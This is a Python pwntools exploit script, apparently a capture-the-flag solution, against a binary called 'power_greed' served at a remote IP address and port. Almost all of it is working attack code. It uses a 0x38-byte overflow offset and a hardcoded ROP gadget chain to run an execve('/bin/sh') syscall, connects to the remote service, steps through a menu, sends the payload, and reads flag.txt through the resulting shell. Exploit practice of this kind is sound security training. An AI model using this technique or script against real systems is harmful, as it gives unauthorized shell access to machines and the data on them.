from pwn import *

# Setup
binary = ELF("./power_greed", checksec=False)
context.binary = binary
context.arch = 'amd64'

# Addresses of gadgets and "/bin/sh"
pop_rax_ret = 0x42adab
pop_rdi_pop_rbp_ret = 0x402bd8
pop_rsi_pop_rbp_ret = 0x40c002
pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0x46f4dc
syscall = 0x40141a
bin_sh = 0x481778

# Offset to return address
offset = 0x38

# Build final payload
payload = flat({
0x38: p64(pop_rdi_pop_rbp_ret) + p64(bin_sh) + p64(0) +
p64(pop_rsi_pop_rbp_ret) + p64(0)*2 +
p64(pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret) + p64(0)*5 +
p64(pop_rax_ret) + p64(0x3b) +
p64(syscall)
})

# Remote target
p = remote("83.136.249.246", 54177)

# Navigate the menu to reach the vulnerable buffer prompt
p.sendlineafter(b">", b"1")
sleep(5)
p.sendlineafter(b">", b"1")
sleep(5)
p.sendlineafter(b"(y/n)", b"y")

# Send the payload
p.sendline(payload)

# Send command to read the flag
p.sendline(b"cat flag.txt")

# Read the flag output
flag = p.recvline()
print(f"Flag: {flag.decode().strip()}")

# Drop to interactive mode
#p.interactive()
